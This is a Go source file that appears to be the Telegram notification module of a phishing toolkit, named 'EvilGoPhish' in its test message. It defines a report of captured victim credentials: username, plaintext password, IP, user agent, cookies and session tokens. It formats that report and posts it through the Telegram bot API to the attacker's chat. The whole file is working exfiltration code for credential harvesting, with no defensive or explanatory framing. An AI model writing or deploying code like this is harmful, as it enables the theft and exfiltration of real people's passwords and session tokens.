package telegram_notifier

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

// TelegramConfig holds the Telegram bot configuration
type TelegramConfig struct {
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
	Enabled  bool   `json:"enabled"`
}

// TelegramNotifier handles sending notifications to Telegram
type TelegramNotifier struct {
	config TelegramConfig
	client *http.Client
}

// CredentialReport represents captured credentials to report
type CredentialReport struct {
	Username      string            `json:"username"`
	Password      string            `json:"password"`
	HiddenService string            `json:"hidden_service"`
	Phishlet      string            `json:"phishlet"`
	Timestamp     time.Time         `json:"timestamp"`
	IP            string            `json:"ip"`
	UserAgent     string            `json:"user_agent"`
	Cookies       map[string]string `json:"cookies,omitempty"`
	Tokens        map[string]string `json:"tokens,omitempty"`
}

// NewTelegramNotifier creates a new Telegram notifier
func NewTelegramNotifier(config TelegramConfig) *TelegramNotifier {
	return &TelegramNotifier{
		config: config,
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

// LoadConfig loads Telegram configuration from file
func LoadConfig(configPath string) (*TelegramConfig, error) {
	data, err := ioutil.ReadFile(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read config file: %v", err)
	}

	var config TelegramConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("failed to parse config: %v", err)
	}

	return &config, nil
}

// SendCredentialReport sends a formatted credential report to Telegram
func (tn *TelegramNotifier) SendCredentialReport(report CredentialReport) error {
	if !tn.config.Enabled {
		return nil // Skip if not enabled
	}

	message := formatCredentialMessage(report)
	return tn.sendMessage(message)
}

// formatCredentialMessage formats the credential report into a readable message
func formatCredentialMessage(report CredentialReport) string {
	msg := fmt.Sprintf("🔐 <b>New Credentials Captured</b>\n\n")
	msg += fmt.Sprintf("🌐 <b>Hidden Service:</b> %s\n", report.HiddenService)
	msg += fmt.Sprintf("🎯 <b>Phishlet:</b> %s\n", report.Phishlet)
	msg += fmt.Sprintf("👤 <b>Username:</b> <code>%s</code>\n", report.Username)
	msg += fmt.Sprintf("🔑 <b>Password:</b> <code>%s</code>\n", report.Password)
	msg += fmt.Sprintf("📍 <b>IP Address:</b> %s\n", report.IP)
	msg += fmt.Sprintf("🕐 <b>Timestamp:</b> %s\n", report.Timestamp.Format("2006-01-02 15:04:05 UTC"))
	msg += fmt.Sprintf("💻 <b>User Agent:</b> %s\n", report.UserAgent)

	if len(report.Tokens) > 0 {
		msg += fmt.Sprintf("\n🎫 <b>Tokens Captured:</b> %d\n", len(report.Tokens))
	}

	if len(report.Cookies) > 0 {
		msg += fmt.Sprintf("🍪 <b>Cookies Captured:</b> %d\n", len(report.Cookies))
	}

	return msg
}

// sendMessage sends a message to the configured Telegram chat
func (tn *TelegramNotifier) sendMessage(text string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tn.config.BotToken)

	payload := map[string]interface{}{
		"chat_id":    tn.config.ChatID,
		"text":       text,
		"parse_mode": "HTML",
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}

	resp, err := tn.client.Post(apiURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s - %s", resp.Status, string(body))
	}

	return nil
}

// TestConnection tests the Telegram bot connection
func (tn *TelegramNotifier) TestConnection() error {
	if !tn.config.Enabled {
		return fmt.Errorf("telegram notifier is disabled")
	}

	testMessage := "✅ EvilGoPhish Telegram Notifier - Connection Test Successful"
	return tn.sendMessage(testMessage)
}
